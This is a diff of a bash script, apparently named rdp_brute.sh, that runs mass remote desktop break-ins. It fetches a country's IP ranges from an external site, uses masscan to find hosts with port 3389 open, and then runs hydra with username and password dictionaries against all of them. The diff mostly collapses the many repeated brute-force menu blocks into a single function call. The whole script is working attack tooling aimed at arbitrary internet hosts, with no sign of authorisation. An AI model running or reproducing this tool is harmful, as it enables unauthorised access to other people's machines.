-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "81" ]; then
@@ -21691,6 +8764,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -21700,53 +8774,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "82" ]; then
@@ -21763,6 +8791,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -21772,53 +8801,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -21836,6 +8819,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -21845,53 +8829,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -21909,6 +8847,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -21918,53 +8857,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -21982,6 +8875,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -21991,53 +8885,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -22055,6 +8903,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -22064,53 +8913,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -22128,6 +8931,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -22137,53 +8941,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -22201,6 +8959,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -22210,53 +8969,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -22274,6 +8987,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -22283,53 +8997,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -22347,6 +9015,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -22356,53 +9025,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -22420,6 +9043,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -22429,53 +9053,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -22493,6 +9071,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -22503,52 +9082,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
+MAINBRUTEMENUEN
 else
 if [ "$country" = "93" ]; then
 curl http://ipdiapazon.16mb.com/Jordan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -22564,6 +9098,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -22573,53 +9108,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "94" ]; then
@@ -22636,6 +9125,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -22645,53 +9135,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
